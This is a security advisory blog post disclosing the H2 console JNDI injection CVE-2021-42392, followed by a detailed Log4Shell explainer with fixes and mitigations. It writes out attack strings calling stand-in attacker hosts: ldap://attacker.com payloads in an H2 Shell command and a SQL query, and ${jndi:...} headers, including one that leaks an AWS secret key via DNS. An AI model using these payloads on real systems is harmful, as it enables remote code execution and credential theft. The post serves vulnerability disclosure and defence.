Update 07/01/22 – Added credit to researcher @pyn3rd for similar independent previous findings in Acknowledgements section

## A short preamble

Very recently, the JFrog security research team has disclosed an issue in the H2 database console which was issued a critical CVE – [CVE-2021-42392](https://nvd.nist.gov/vuln/detail/CVE-2021-42392). This issue has the same root cause as the infamous [Log4Shell](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/) vulnerability in Apache Log4j (JNDI remote class loading).

H2 is a very popular open-source Java SQL database offering a lightweight in-memory solution that doesn’t require data to be stored on disk. This makes it a popular data storage solution for various projects from web platforms like [Spring Boot](https://spring.io/projects/spring-boot) to IoT platforms like [ThingWorks](https://www.ptc.com/en/products/thingworx). The [com.h2database:h2](https://mvnrepository.com/artifact/com.h2database/h2) package is part of the top 50 most popular Maven packages, with almost **7000 artifact dependencies**.

Due to the current sensitivities around anything (Java) JNDI-related, we want to clarify a few of the conditions and configurations that must be present in order to be at risk before getting into the technical details of our H2 vulnerability findings.

Although this is a critical issue with a similar root cause, CVE-2021-42392 should not be as widespread as Log4Shell (CVE-2021-44228) due to the following factors:

1. Unlike Log4Shell, this vulnerability has a “direct” scope of impact. This means that typically the server that processes the initial request (the H2 console) will be the server that gets impacted with RCE. This is less severe compared to Log4Shell since the vulnerable servers should be easier to find.
2. On vanilla distributions of the H2 database, by default the H2 console only listens to localhost connections – making the default setting safe. This is unlike Log4Shell which was exploitable in the default configuration of Log4j. However – it’s worth noting the H2 console can easily be changed to listen to remote connections as well.
3. Many vendors may be running the H2 database, but not running the H2 console. Although there are other vectors to exploit this issue other than the console, these other vectors are context-dependent and less likely to be exposed to remote attackers.

That being said, if you are running an H2 console which is exposed to your LAN (or worse, WAN) this issue is extremely critical (unauthenticated remote code execution) and you **should update your H2 database to version 2.0.206 immediately**.

We have also observed that many developer tools are relying on the H2 database and specifically exposing the H2 console (some examples are included later in the blog post). The recent trend of supply chain attacks targeting developers, such as [malicious packages in popular repositories](https://jfrog.com/blog/malicious-npm-packages-are-after-your-discord-tokens-17-new-packages-disclosed/), emphasizes the importance of developer tools being made secure for all reasonable use cases. We hope that many H2-dependent developer tools will also be safer after this fix is applied.

## Why are we scanning for JNDI flaws?

One of our key takeaways from the Log4Shell vulnerability incident was that due to the widespread usage of JNDI, there are bound to be more packages that are affected by the same root cause as Log4Shell – accepting arbitrary JNDI lookup URLs. Thus, we’ve adjusted our automated vulnerability detection framework to take into consideration the `javax.naming.Context.lookup` function as a dangerous function (sink) and unleashed the framework onto the [Maven repository](https://mvnrepository.com/artifact/log4j/log4j) to hopefully find issues similar to Log4Shell.

One of the first validated hits we got was on the H2 database package. After confirming the issue we reported it to the H2 maintainers, who promptly fixed it in a new release and created a [critical GitHub advisory](https://github.com/h2database/h2database/security/advisories/GHSA-h376-j262-vhq6). Subsequently, we’ve also issued a critical CVE – [CVE-2021-42392](https://nvd.nist.gov/vuln/detail/CVE-2021-42392).

In this blogpost, we will present several attack vectors that we’ve found in the H2 database that allow triggering a remote JNDI lookup, with one of the vectors allowing for unauthenticated remote code execution.

## Vulnerability root cause – JNDI remote class loading

In a nutshell, the root cause is similar to Log4Shell – several code paths in the H2 database framework pass unfiltered attacker-controlled URLs to the `javax.naming.Context.lookup` function, which allows for remote codebase loading (AKA Java code injection AKA remote code execution).

Specifically, the `org.h2.util.JdbcUtils.getConnection` method takes a driver class name and database URL as parameters. If the driver’s class is assignable to the `javax.naming.Context` class, the method instantiates an object from it and calls its lookup method:

```
else if (javax.naming.Context.class.isAssignableFrom(d)) {
    // JNDI context
    Context context = (Context) d.getDeclaredConstructor().newInstance();
    DataSource ds = (DataSource) context.lookup(url);
    if (StringUtils.isNullOrEmpty(user) && StringUtils.isNullOrEmpty(password)) {
        return ds.getConnection();
    }
    return ds.getConnection(user, password);
}
```

Supplying a driver class such as `javax.naming.InitialContext` and a URL such as `ldap://attacker.com/Exploit` will lead to remote code execution.

We can’t imagine there is anyone on Earth that isn’t familiar with this attack flow by now, but a visualization may still be helpful –

![JNDI Attack flow](data:image/svg+xml...)![JNDI Attack flow](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2022/01/06182200/1_-attack-flow.png)

## CVE-2021-42392 attack vectors

### H2 console – non-context-dependent, unauthenticated RCE

The most severe attack vector of this issue is through the H2 console.

The H2 database contains an embedded [web-based console](https://github.com/h2database/h2database/blob/3653ab38381c47cc37a57ef47bd133af15d496c4/h2/src/main/org/h2/server/web/WebApp.java), which allows easy management of the database. It’s available by default on <http://localhost:8082> when running the H2 package JAR –

```
java -jar bin/h2.jar
```

Or, on Windows, through the Start menu –

![Windows start menu - H2 Console App](data:image/svg+xml...)![Windows start menu - H2 Console App](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2022/01/06182511/2_-Windowns-start-menu.png)

Additionally, when H2 is used as an embedded library, the console can be started from Java –

```
h2Server = Server.createWebServer("-web", "-webAllowOthers", "-webPort", "8082");
h2Server.start();
```

Access to the console is protected by a login form, which allows passing the “driver” and “url” fields to the corresponding fields of `JdbcUtils.getConnection`. This leads to unauthenticated RCE, since the username and password are not validated before performing the lookup with the potentially malicious URL.

![Generic H2 - Login Form](data:image/svg+xml...)![Generic H2 - Login Form](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2022/01/06182802/3_-Login-form.png)

By default, the H2 console can be accessed from the localhost only. This option can be changed either through the console’s UI:

![H2 Console Preferences UI](data:image/svg+xml...)![H2 Console Preferences UI](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2022/01/06182906/4_-H2-Console-Preferences-UI.png)

Or via a command line argument: `-webAllowOthers`.

Unfortunately, we’ve observed that some third-party tools relying on the H2 database will run the H2 console exposed to remote clients **by default**. For example, the [JHipster framework](https://www.jhipster.tech/) also exposes the H2 console, and by default sets the `webAllowOthers` property to `true`:

```
# H2 Server Properties
0=JHipster H2 (Memory)|org.h2.Driver|jdbc\:h2\:mem\:jhbomtest|jhbomtest
webAllowOthers=true
webPort=8092
webSSL=false
```

As it follows from the [documentation](https://www.jhipster.tech/development/), when running your application using the JHipster framework, by default the H2 console is available at the JHipster web interface on the `/h2-console` endpoint:

![JHipster web interface](data:image/svg+xml...)![JHipster web interface](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2022/01/06190337/5_-JHipster-web-interface.png)

Since the H2 database is used by so many artifacts, it’s hard to quantify how many vulnerable deployments of the H2 console exist in the wild. We consider this to be the most severe attack vector, also due to the fact that it is possible to locate WAN-facing vulnerable consoles by using public search tools.

### H2 Shell tool – context-dependent RCE

In the built-in [H2 shell](https://github.com/h2database/h2database/blob/master/h2/src/main/org/h2/tools/Shell.java), an attacker with control of the command line arguments can invoke the same vulnerable `driver` and `url` as already mentioned:

```
java -cp h2*.jar org.h2.tools.Shell -driver javax.naming.InitialContext -url ldap://attacker.com:1387/Exploit
```

We consider this attack vector to be highly unlikely, since custom code needs to exist that pipes remote input to these command line arguments. The attack may be more likely if such custom code exists, which gives the attacker control on a part of the command line, but also contains a parameter injection attack. See our [Yamale blogpost](https://jfrog.com/blog/23andmes-yamale-python-code-injection-and-properly-sanitizing-eval/) for more details on such an attack.

### SQL-based vectors – authenticated (high privileges) RCE

The vulnerable `JdbcUtils.getConnection` can also be invoked by several SQL stored procedures, available by default in the H2 database. We have identified several procedures, but they all share the same property which makes this attack vector less severe – only an authenticated (DB) admin may invoke them.

For example, the [LINK\_SCHEMA](http://www.h2database.com/html/functions.html#link_schema) stored procedure directly passes driver and URL arguments into the vulnerable function, as illustrated in the following query –

```
SELECT * FROM LINK_SCHEMA('pwnfr0g', 'javax.naming.InitialContext', 'ldap://attacker.com:1387/Exploit', 'pwnfr0g', 'pwnfr0g', 'PUBLIC');
```

Since the stored procedure is limited to DB admins only, we believe the most likely attack vector would be the escalation of a separate SQL injection flaw to RCE.

## How can I check if I’m vulnerable to CVE-2021-42392?

Network administrators can scan their local subnets for open instances of the H2 console with [nmap](https://nmap.org/), for example –

```
nmap -sV --script http-title --script-args "http-title.url=/" -p80,443,8000-9000 192.168.0.0/8 | grep "H2 Console"
```

*(The default console endpoint in vanilla installations is “/”, this may be different in H2 consoles deployed via 3rd-party tools)*

Any returned servers are highly likely to be exploitable.

As mentioned above, there are other attack vectors, but remote exploitation through them is much less likely. In any case we suggest upgrading the H2 database (see “Suggested Fix”).

## How did JFrog detect CVE-2021-42392?

The issue can be detected via data flow analysis (DFA), when defining Java’s built-in `HttpServlet.doGet/doPost` methods as a user input source (specifically the 1st req argument), and the aforementioned `javax.naming.Context.lookup` method (which performs JNDI lookup) as a dangerous function/sink.

The data flow in this case is fairly straightforward, albeit requiring the tracing of some class fields. The variables marked in red represent the traced data –

![CVE-2021-42392 - traced data](data:image/svg+xml...)![CVE-2021-42392 - traced data](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2022/01/06231723/code1.png)

## What is the suggested fix for CVE-2021-42392?

We recommend all users of the H2 database to upgrade to [version 2.0.206](https://github.com/h2database/h2database/releases/tag/version-2.0.206), even if you are not directly using the H2 console. This is due to the fact that other attack vectors exist, and their exploitability may be difficult to ascertain.

Version 2.0.206 fixes CVE-2021-42392 by limiting JNDI URLs to use the (local) `java` protocol only, which denies any remote LDAP/RMI queries. This is similar to the fix applied in [Log4j 2.17.0](https://jfrog.com/cheat-sheet/log4j-log4shell-survival-guide/).

## How can CVE-2021-42392 be mitigated?

The best fix for the vulnerability is to upgrade the H2 database.

For vendors that are currently unable to upgrade H2, we offer the following mitigation options:

1. Similarly to the Log4Shell vulnerability, newer versions of Java contain the `trustURLCodebase` mitigation that will not allow remote codebases to be loaded naively via JNDI. Vendors may wish to upgrade their Java (JRE/JDK) version to enable this mitigation.

   This mitigation is enabled by default on the following versions of Java (or any later version) –
   * 6u211
   * 7u201
   * 8u191
   * 11.0.1

   However, this mitigation is not bulletproof, as it can be bypassed by sending a serialized “gadget” Java object through LDAP, as long as the respective “gadget” class is included in the classpath (depends on the server that runs the H2 database). For more information, please see “[Using serialized Java Objects with local gadget classes](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/#appendix-b)” from our Log4Shell blog post.
2. When the H2 console Servlet is deployed on a web server (not using the standalone H2 web server), a security constraint can be added that will allow only specific users access to the console page. [A suitable configuration example can be found here](https://h2database.com/html/tutorial.html#usingH2ConsoleServlet).

## Acknowledgements

We would like to thank the H2 database maintainers for validating and fixing these issues extremely quickly and for responsibly creating a security advisory for the issue.

We would like to give credit to the researcher @pyn3rd that showed a finding similar to one of the attack vectors mentioned here, before this publication. Specifically the fact that Spring Boot is susceptible to the H2 console JNDI issue, under non-default configuration.

JFrog’s research efforts were completely independent to this finding, which wasn’t spotted by our research team nor the H2 maintainers, possibly due to the fact that no official advisories were published and that the publication wasn’t in English (which affects search results).

Since our research highlights the root cause of the issue, and was disclosed properly to the H2 maintainers (which weren’t aware of any previous findings) – the aforementioned fixed version of the H2 database, 2.0.206, was created based on our disclosure and supplied patch.

We feel that upgrading to a fixed version of H2 is even more important now, since some attackers may have seen the previous finding, extrapolated about the general issue, and have been using similar attack vectors for a while now.

As always, we encourage security researchers to publish their findings only after contacting the maintainers and making sure a fixed version is widely available.

## Conclusion

To conclude, we highly recommend upgrading your H2 database to the [latest version](https://github.com/h2database/h2database/releases/tag/version-2.0.206), in order to avoid possible exploitation of CVE-2021-42392.

The JFrog Security Research team is continuously scanning for similar JNDI vulnerabilities, both for responsible disclosure purposes and for improving our future zero-day detection capabilities for our [JFrog Xray](https://jfrog.com/xray/) customers.

To the best of our knowledge, CVE-2021-42392 is the first JNDI-related unauthenticated RCE vulnerability to be published since Log4Shell, but we suspect it won’t be the last.

# Log4j Log4Shell 0-Day Vulnerability: All You Need To Know

![Log4Shell Vulnerability Explained](data:image/svg+xml...)![Log4Shell Vulnerability Explained](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2021/09/23185759/863x300-16.png)

On Thursday, Dec 9th 2021, a researcher from the Alibaba Cloud Security Team dropped a zero-day remote code execution exploit on Twitter, targeting the extremely popular [log4j](https://logging.apache.org/log4j/2.x/) logging framework for Java (specifically, the 2.x branch called **Log4j2**). The vulnerability was originally [discovered and reported to Apache](https://help.aliyun.com/noticelist/articleid/1060971232.html) by the Alibaba cloud security team on November 24th. MITRE assigned [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) to this vulnerability, which has since been dubbed Log4Shell by security researchers.

Since December 9th, the [Log4j vulnerability](https://jfrog.com/log4j-log4shell-resources/) has been reported to be massively exploited in the wild, due to the fact that it is trivially exploitable (weaponized PoCs are available publicly) and extremely popular, and got a wide coverage on media and social networks.

In this technical blog post, we will clarify the exploitation vectors for this issue, provide accurate research-backed novel information on exactly what is vulnerable (as some reports have been inaccurate), suggest Log4j vulnerability remediations for vendors that cannot easily upgrade their log4j version and answer some burning questions that we’ve been asked on this vulnerability (such as the efficacy of some suggested mitigations floating around in the last couple of days).

**Note**: JFrog products are not affected, as they are not using the log4j-core package.

##

## What causes the Log4j Log4Shell vulnerability?

Log4j2 supports by default a logging feature called “[Message Lookup Substitution](https://logging.apache.org/log4j/2.x/manual/lookups.html)”. This feature enables certain special strings to be replaced, at the time of logging, by other dynamically-generated strings. For example, logging the string `Running ${java:runtime}` will yield an output similar to:

`Running Java version 1.7.0_67`

It has been discovered that one of the lookup methods, specifically the **JNDI** lookup paired with the **LDAP** protocol, will fetch a specified Java class from a remote source and deserialize it, executing some of the class’s code in the process.

**This means that if any part of a logged string can be controlled by a remote attacker, the remote attacker gains remote code execution on the application that logged the string.**

The most common substitution string that takes advantage of this issue will look similar to:

`${jndi:ldap://somedomain.com}`

Note that the following protocols may also be used for exploiting this issue (some of them may not be available by default) –

`${jndi:ldaps://somedomain.com}`

`${jndi:rmi://somedomain.com}`

`${jndi:dns://somedomain.com}` (Allows detecting vulnerable servers, does not lead to code execution.)

The basic attack flow can be summarized by the following diagram:

## Why is Log4Shell so dangerous?

The vulnerability, which received the highest CVSS score possible – 10.0 – is extremely dangerous due to a number of factors:

1. Exploitation of the vulnerability is trivial and persistent, with tons of [weaponized exploits available on GitHub](https://github.com/o7-Fire/Log4Shell) and other public sources.
2. Log4j2 is one of the most popular Java logging frameworks. There are currently [almost 7,000](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages) Maven artifacts that depend on log4j-core (the vulnerable artifact), and there are countless others Java projects that use it.
3. The vulnerability can easily be used in a drive-by-attack scenario by bombarding random HTTP servers with requests similar to:

`GET / HTTP/1.1`

`Host: somedomain.com`

`User-Agent: ${jndi:ldap://attacker-srv.com/foo}`

Or alternatively, a specific webapp can be brute-forced by filling all available HTML input fields with the payload string, using automated tools such as [XSStrike](https://github.com/s0md3v/XSStrike).

4. Although the vulnerability is context-dependent, since arbitrary user input must reach one of the Log4j2 logging functions (see next section), this scenario is extremely common. In most logging scenarios, part of the log message contains input from the user. Such input is rarely sanitized since it is considered to be extremely safe.

## When exactly is the Log4j vulnerability exploitable?

All of the following conditions must apply in order for a specific Java application to be vulnerable:

* The Java application uses log4j (Maven package [log4j-core](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core)) version 2.0.0-2.12.1 or 2.13.0-2.14.1
  + Version 2.12.2 is not vulnerable, since it received backported fixes from 2.16.0.
* A remote attacker can cause arbitrary strings to be logged, via one of the logging APIs – `logger.info()`, `logger.debug()`, `logger.error()`, `logger.fatal()`, `logger.log()`, `logger.trace()`, `logger.warn()`.
* No Log4j-specific mitigations have been applied (see the next “Mitigations” section).
* (on some machines) The Java JRE / JDK version in use is older than the following versions:
  + 6u211
  + 7u201
  + 8u191
  + 11.0.1

This is due to the fact that later versions set the JVM property `com.sun.jndi.ldap.object.trustURLCodebase` to **false** by default, which disables JNDI loading of classes from arbitrary URL code bases.

Note that relying only on a new Java version as protection against this vulnerability is risky, since the vulnerability may still be exploited on machines that contain certain “gadget” classes in the classpath of the vulnerable application. See [Appendix B](#appendix-b) – “Exploiting Log4Shell in newer Java versions.”

##

## Are JFrog products vulnerable?

It’s important to note that JFrog Security has validated that [JFrog Platform solutions themselves are not affected](https://jfrog.com/knowledge-base/general-jfrog-services-are-not-affected-by-vulnerability-cve-2021-44228), as no products, including Artifactory, [Xray](https://jfrog.com/xray/), [JFrog distribution](https://jfrog.com/distribution/), Insight, Access or Mission Control, are using the log4j-core package.

For avoidance of doubt, JFrog products are not affected by any of the following CVEs –

* CVE-2021-44228
* CVE-2021-45046
* CVE-2021-45105
* CVE-2021-44832

## I’m using the log4j-api package, am I vulnerable?

Note that some advisories claimed the [Maven package log4j-api](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api) was vulnerable to this issue. JFrog’s security research team looked into this claim and concluded that **log4j-api (by itself) is not vulnerable.** This is due to the lack of `JndiLookup` functionality, and can be easily seen by trying to trigger the vulnerable code.

![are log4j-api packag users affected by log4shell?](data:image/svg+xml...)![are log4j-api packag users affected by log4shell?](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2021/12/13022329/image2-1.png)

Running this code with only log4j-api installed yielded the following output:

`ERROR StatusLogger Log4j2 could not find a logging implementation. Please add log4j-core to the classpath. Using SimpleLogger to log to the console...`

When running the same code with the `SimpleLogger` class, the lookup string is logged verbatim, but no lookup code is triggered (since it does not exist.)

## How can I completely fix the Log4j Log4shell issue?

The best fix for this issue would be to upgrade your log4j dependencies to version [2.16.0](https://github.com/apache/logging-log4j2/releases/tag/rel/2.15.0), which completely resolves the issue by disabling JNDI by default and removing support for message lookups.

Upgrading to version 2.15.0 will also completely shield default configurations from remote exploitation, although most of the mitigations added by version 2.15.0 have already been bypassed (See [Appendix D](#appendix-d)). To remain future-proof we recommend upgrading to 2.16.0 as soon as possible.

## Can I mitigate the Log4shell vulnerability without upgrading a version?

Although we recommend fixing the vulnerability completely by upgrading the log4j version to a fixed version, it is possible to completely mitigate the issue without upgrading:

### Method 1: For log4j 2.10.0 and later versions – Disabling lookups:

**Update** – This mitigation method can be bypassed in rare non-default configurations, via CVE-2021-45046. See [Appendix C](#appendix-c) for more information. We still recommend vendors that cannot upgrade to a newer Log4j2 version to use both this mitigation method and mitigation method 2 specified below. Mitigation method 2 (removing the vulnerable class) is not affected by CVE-2021-45046.

If using log4j 2.10.0 or any later version, we recommend disabling message lookups globally by setting the environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS` to `true` by executing this command before Java applications are loaded in one of the system’s init scripts:

`export LOG4J_FORMAT_MSG_NO_LOOKUPS=true`

This can also be done system-wide by editing the `/etc/environment` file and adding:

`LOG4J_FORMAT_MSG_NO_LOOKUPS=true`

**This method can be used as an additional protection layer** in case you suspect not all dependencies have been properly updated, and even to protect against third-party Java packages that depend/embed a vulnerable version of and have not been properly patched yet.

Alternatively, lookups can be disabled for a specific invocation of the JVM by adding the following command-line flag when running the vulnerable Java application: `‐Dlog4j2.formatMsgNoLookups=True`

For example –

`java ‐Dlog4j2.formatMsgNoLookups=True -jar vulnerable.jar`

### Method 2 – For all 2.x versions: removing the vulnerable class

On all log4j 2.x versions, it is possible to remove the `JndiLookup` class from any Java applications by executing this command:

```
find ./ -type f -name "log4j-core-*.jar" -exec zip -q -d "{}" org/apache/logging/log4j/core/lookup/JndiLookup.class \;
```

This will recursively find all log4j-core JAR files, starting from the current directory, and remove the vulnerable `JndiLookup` class from them. For full coverage, the command may be executed from the root directory of your project or server.

Note: This method is recommended only as a last resort since it is possible that the vulnerable `JndiLookup` class is embedded in recursive JAR files or in locations that the zip command is not accessible to. When choosing this method, it is highly recommended to verify manually that no `JndiLookup` classes are available to any Java application.

## How can I use JFrog Xray to detect the Log4shell vulnerability?

Xray customers can scan artifacts as usual for detecting CVE-2021-44228. As always this can be done through **CI/CD.**

### Vulnerable Example

Example application that will be vulnerable to remote exploitation (from [LunaSec’s advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/)):

```
import org.apache.logging.log4j.LogManager;

import org.apache.logging.log4j.Logger;

import java.io.*;

import java.sql.SQLException;

import java.util.*;

public class VulnerableLog4jExampleHandler implements HttpHandler {

  static Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());

  /**

   * A simple HTTP endpoint that reads the request's User Agent and logs it back.

   * This is basically pseudo-code to explain the vulnerability, and not a full example.

   * @param he HTTP Request Object

   */

  public void handle(HttpExchange he) throws IOException {

    String userAgent = he.getRequestHeader("user-agent");

    // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.

    // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}

    log.info("Request User Agent:{}", userAgent);

    String response = "Hello There, " + userAgent + "!";

    he.sendResponseHeaders(200, response.length());

    OutputStream os = he.getResponseBody();

    os.write(response.getBytes());

    os.close();

  }

}
```
#### Appendix B –

### **Exploiting Log4Shell in newer Java versions**

#### Method 1 – Abusing other message lookups

Although JNDI remote class loading is disabled in newer Java versions, the message lookup mechanism itself still works, and can be abused for various purposes:

1. As mentioned before, using a string such as `${jndi:dns://dnsserver.com/somedomain}` will cause the victim to send a DNS query to dnsserver.com (querying about the **somedomain** DNS record). This can be used to detect vulnerable log4j instances, tunnel back data or even as a DDoS attack (given enough vulnerable services)
2. There are several [lookup substitutions](https://logging.apache.org/log4j/2.x/manual/lookups.html) that reveal sensitive information from the victim machine. Most prominently, using the attack string `${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.attacker-srv.com/foo}` (with any protocol type) may leak the machine’s secret AWS access key, if this environment variable was exported to the vulnerable log4j process. Naturally, the attack string can be modified to leak any environment variable present in the vulnerable log4j process. Other interesting information-leaking lookups include:
   1. `${main:x}` – leak the value of command line argument #x, which may contain sensitive data such as passwords or access keys passed through the command line.
   2. `${sys:propname}` – leak the value of a [Java System Property](https://docs.oracle.com/javase/tutorial/deployment/doingMoreWithRIA/properties.html). For example this can be used to leak the current username (`user.name`):

![log4shell - identify the security bearch - leaked username](data:image/svg+xml...)![log4shell - identify the security bearch - leaked username](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2021/12/13164331/image1-2.png)

#### Method 2 – Abusing factory classes in the local classpath

As thoroughly explained in [this Veracode blog post](https://www.veracode.com/blog/research/exploiting-jndi-injections-java), there are ways to exploit JNDI injections even on newer versions of Java, where remote deserializations are disabled.

For example, if the `org.apache.naming.factory.BeanFactory` class (which is usually shipped with [Apache Tomcat](https://tomcat.apache.org/) servers) is available in the classpath of the vulnerable application that uses log4j, then the Log4Shell vulnerability can be exploited for remote code execution, regardless of the underlying JRE/JDK version.

This is due to the fact that even though newer versions of Java will not deserialize remote arbitrary classes, the attacker can still control the factory class and its attributes, through the supplied JNDI Reference:

![Application that uses log4j, Log4Shell vulnerability can be exploited - Appache example - ](data:image/svg+xml...)![Application that uses log4j, Log4Shell vulnerability can be exploited - Appache example - ](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2021/12/13022327/image1-1.png)

The remote attacker cannot supply an arbitrary factory class, but can reuse any factory class in the vulnerable program’s classpath as a gadget.

A useable factory class would have the following properties:

* Exist in the vulnerable program’s classpath
* Implement the `ObjectFactory` interface
* Implement the `getObjectInstance` method
* Perform dangerous actions with the `Reference`’s attributes

The researchers identified that the `BeanFactory` class fits this bill, due to its dangerous use of Reflection – Arbitrary Java code objects are created, based solely on the Reference’s string attributes, which are attacker controlled.

The blog references full exploit code for hosting an RMI server with the proper Reference that can be used to exploit Log4shell in newer Java versions, on machines where the `BeanFactory` class is available in the vulnerable application’s classpath.

Note that the Log4Shell attack string for using such a server will be similar to –

`${jndi:rmi://attacker-srv.com/foo}`

However, the provided RMI server can also be converted to a **ldap** or **ldaps** server, in which case the attack string will change accordingly.

Since other “factory gadgets” such as the `BeanFactory` class may be found in the future, we highly suggest not relying on a newer Java version as the only line of defense against Log4Shell, and upgrading log4j and/or implementing some of our proposed mitigations.

####

#### Method 3 – Using serialized Java Objects with local gadget classes

As mentioned above, the naive attack vector will instruct the vulnerable Log4j2-based application to retrieve a remote serialized class, usually via LDAP, and load it – allowing the attacker full control on the contents of the class.

However, LDAP also supports sending a serialized Java Object (instance of a class) in the LDAP request itself, by using the `javaSerializedData` attribute.

Deserializing the Object is only possible if the Object’s class is available in the current classpath (a list of directories and JAR files that’s searched for classes).

An important distinction is that when deserializing an object, the `trustURLCodebase` security mitigation has no effect, since that specific mitigation only prevents loading of new codebases.

It is well-known that some specific Objects can directly lead to remote code execution when they are deserialized – the classes that these Objects are based on are colloquially called “gadgets”.

For example –  the [ysoserial](https://github.com/frohoff/ysoserial) proof-of-concept tool aggregates some of these well known gadgets, and allows generation of Objects with arbitrary code execution payloads.

Therefore – an attacker that knows that a specific “gadget” class is present in the vulnerable application’s classpath, can generate such an Object, send it through LDAP and gain code execution when it is deserialized, regardless of the `javaSerializedData` attribute.

Furthermore – due to the information-leaking properties of the vulnerability mentioned above, an attacker may be able to build a fully-automated tool that first queries specific system properties from the vulnerable application (through the use of recursive lookups), determine if any gadget classes are present in the vulnerable application and then build a target-specific payload to gain remote code execution.

Until today, we have not seen such a tool publicly available or used in the wild, but unfortunately we believe that this malicious campaign is still far from over.

#### Appendix C –

### Bypassing the `LOG4J_FORMAT_MSG_NO_LOOKUPS` mitigation by using CVE-2021-45046

We would like to preface this section by saying that the prerequisites for performing this bypass are highly unlikely, and as such we still consider the `LOG4J_FORMAT_MSG_NO_LOOKUPS` mitigation effective in the vast majority of cases.

Due to the disclosure of CVE-2021-45046, it was revealed that one of the suggested mitigation techniques, namely – disabling the message lookup mechanism, can be bypassed in certain non-default configurations.

The bottom line is – if CVE-2021-45046 can be exploited on **Log4j2 2.10.0 – 2.14.1** (inclusive), it allows the attacker to bypass both the `LOG4J_FORMAT_MSG_NO_LOOKUPS` environment variable mitigation, and the `log4j2.noFormatMsgLookup` system property mitigation.

So – what are the conditions for the exploitation of CVE-2021-45046?

(Credit to community project [log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) that implemented similar example conditions)

1. A new (non-default) pattern layout must be added to the Log4j2 configuration. The pattern layout must use a Context Lookup (`${ctx:`). An example of a vulnerable `log4j2.properties` file –

   ```
   # vulnerable in 2.14.1 even with ENV LOG4J_FORMAT_MSG_NO_LOOKUPS true
   appender.console.layout.pattern = ${ctx:useragent} - %d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n
   ```

   Note that the [Log4j2 configuration](https://logging.apache.org/log4j/2.x/manual/configuration.html) can be specified in many different ways, but in any case there are no default Context Lookup pattern layouts –

   ![COnfiguration of Log4j 2](data:image/svg+xml...)![COnfiguration of Log4j 2](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2021/12/16013016/log4j2_config.png)

2. The vulnerable application must use a Thread Context Map, where the attacker has control of the input data, for example:

   ```
   public void handle(HttpExchange he) throws IOException {
       // userAgent is attacker-controlled
       String userAgent = he.getRequestHeader("User-Agent");

       // Note that 1st argument matches the variable name from the configured pattern
       ThreadContext.put("useragent", userAgent);

       // The log message itself doesn't need to contain any message lookup
       log.info("Received a request with User-Agent");
       ...
   ```

In case both of these conditions exist, an attacker can send an attack token “as usual” – for example in this case, the attacker may send an HTTP request such as –

```
GET / HTTP/1.1
Host: somedomain.com
User-Agent: ${jndi:ldap://attacker-srv.com/foo}
```

and code execution will occur, despite the `LOG4J_FORMAT_MSG_NO_LOOKUPS` mitigation.

**Update #1 –** more examples of vulnerable patterns, as tweeted by @pwntester –

#### MapMessage

Example pattern layout:

`appender.console.layout.pattern = ${map:tainted} ...`

Example Java code passing user-controlled data (TAINTED):

`MapMessage msg = new StringMapMessage().with("message", "H").with("tainted", TAINTED);

logger.error(msg);`

#### Jackson (only if [Jackson](https://github.com/FasterXML/jackson) is in the application’s classpath)

Example pattern layout:

`appender.console.layout.pattern = ${map:tainted} ...`

Example Java code passing user-controlled data (TAINTED):

`logger.info(new ObjectMessage(TAINTED));`

####

#### StructuredDataMessage

Example pattern layout:

`appender.console.layout.pattern = ${sd:tainted} ...`

Example Java code passing user-controlled data (TAINTED):

`StructuredDataMessage m = new StructuredDataMessage("1", "H", "event");``m.put("tainted", TAINTED);

logger.error(m);`

**Update #2 –** Even more examples of vulnerable patterns, discovered and validated by the JFrog security research team –

#### Environment

Example pattern layout:

`appender.console.layout.pattern = ${env:TAINTED_ENV_VAR} ...`

#### Main Arguments

Example pattern layout:

`appender.console.layout.pattern = ${main:0} ...`

Example Java code passing user-controlled data (TAINTED):

`MainMapLookup.setMainArguments(args);

logger.error("foo");`

**Event (Message)**

Example configuration:

```

<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN" name="RoutingTest">
  <Appenders>
    <Routing name="Routing">
      <Routes>
        <Route pattern="aaa">
          <Console name="STDOUT">
            <PatternLayout>
              <pattern>${event:Message} ... </pattern>
            </PatternLayout>
          </Console>
        </Route>
      </Routes>
    </Routing>
  </Appenders>
  <Loggers>
    <Root level="error">
      <AppenderRef ref="Routing" />
    </Root>
  </Loggers>
</Configuration>

 This will effectively turn message lookups back on. As such, exploitation can be performed similarly to older Log4j versions - logger.info("${jndi:ldap://attacker.com/foo}");
```
#### Appendix D –

